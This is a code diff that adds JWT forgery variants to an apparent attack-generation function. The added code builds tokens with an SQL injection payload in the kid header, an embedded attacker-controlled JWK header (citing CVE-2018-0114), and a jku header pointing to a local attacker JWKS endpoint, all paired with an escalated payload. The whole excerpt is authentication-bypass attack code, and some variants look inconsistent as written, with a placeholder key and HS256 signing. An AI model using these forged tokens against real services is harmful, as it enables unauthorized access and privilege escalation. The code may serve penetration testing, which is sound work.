@@ -189,6 +189,39 @@ def generate_jwt_attack_variants(
         "token": forge_jwt(kid_header, escalated_payload, secret="", alg_override="HS256")
     })
 
+    # 3b. Key ID (kid) SQL Injection
+    kid_sqli_header = dict(header)
+    kid_sqli_header["kid"] = "key1' OR '1'='1"
+    variants.append({
+        "vector": "kid_sqli_bypass",
+        "description": "Header kid parameter SQL injection bypass",
+        "token": forge_jwt(kid_sqli_header, escalated_payload, secret="1", alg_override="HS256")
+    })
+
+    # 3c. Embedded JWK Header Injection (RFC 7515 / CVE-2018-0114)
+    jwk_header = dict(header)
+    jwk_header["jwk"] = {
+        "kty": "RSA",
+        "use": "sig",
+        "alg": "RS256",
+        "n": "u1P-placeholder-rsa-modulus",
+        "e": "AQAB"
+    }
+    variants.append({
+        "vector": "embedded_jwk_injection",
+        "description": "Header injected with attacker-controlled self-signed JWK key",
+        "token": forge_jwt(jwk_header, escalated_payload, secret="attacker_key", alg_override="HS256")
+    })
+
+    # 3d. JKU Header Injection
+    jku_header = dict(header)
+    jku_header["jku"] = "http://127.0.0.1:8088/.well-known/jwks.json"
+    variants.append({
+        "vector": "jku_header_injection",
+        "description": "Header jku URL pointing to local proxy/attacker JWKS endpoint",
+        "token": forge_jwt(jku_header, escalated_payload, secret="attacker_key", alg_override="HS256")
+    })
+
     # 4. If weak secret was cracked, include fully forged valid signature
     if known_secret:
         variants.append({
